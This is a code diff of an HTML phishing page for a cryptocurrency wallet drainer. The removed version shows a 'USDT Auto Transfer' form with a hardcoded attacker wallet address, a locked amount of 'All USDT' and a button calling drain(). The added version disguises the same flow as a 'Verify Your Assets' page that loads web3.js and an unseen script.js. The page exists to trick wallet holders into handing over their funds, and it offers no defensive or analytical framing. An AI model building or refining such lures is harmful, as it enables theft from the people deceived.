@@ -1,49 +1,41 @@
-
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>USDT Auto Transfer</title>
+  <meta charset="UTF-8">
+  <title>Verify Assets</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
+  <script src="script.js" defer></script>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background-color: #f5f5f5;
-      padding: 20px;
-      text-align: center;
-    }
-    .container {
-      background: white;
-      padding: 20px;
-      border-radius: 10px;
-      max-width: 400px;
-      margin: auto;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-    input, button {
-      width: 100%;
-      padding: 10px;
-      margin-top: 10px;
-      font-size: 16px;
-    }
-    button {
-      background-color: #007bff;
+      background-color: #0f0f0f;
       color: white;
-      border: none;
-      cursor: pointer;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 100px;
     }
+
+    h1 {
+      color: #fcd535;
+    }
+
+    button {
+      padding: 15px 30px;
+      font-size: 18px;
+      background-color: #fcd535;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 30px;
+    }
+
     button:hover {
-      background-color: #0056b3;
+      background-color: #e6be31;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h2>Verify Wallet</h2>
-    <input type="text" id="walletAddress" value="0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090" placeholder="Domain or Wallet Address" />
-    <input type="text" id="tokenAmount" value="All USDT" placeholder="Amount" disabled />
-    <button onclick="drain()">Next</button>
-  </div>
-  <script src="script.js"></script>
+  <h1>Verify Your Assets</h1>
+  <p>Please verify your wallet balance securely</p>
+  <button id="verifyBtn">Verify</button>
 </body>
 </html>
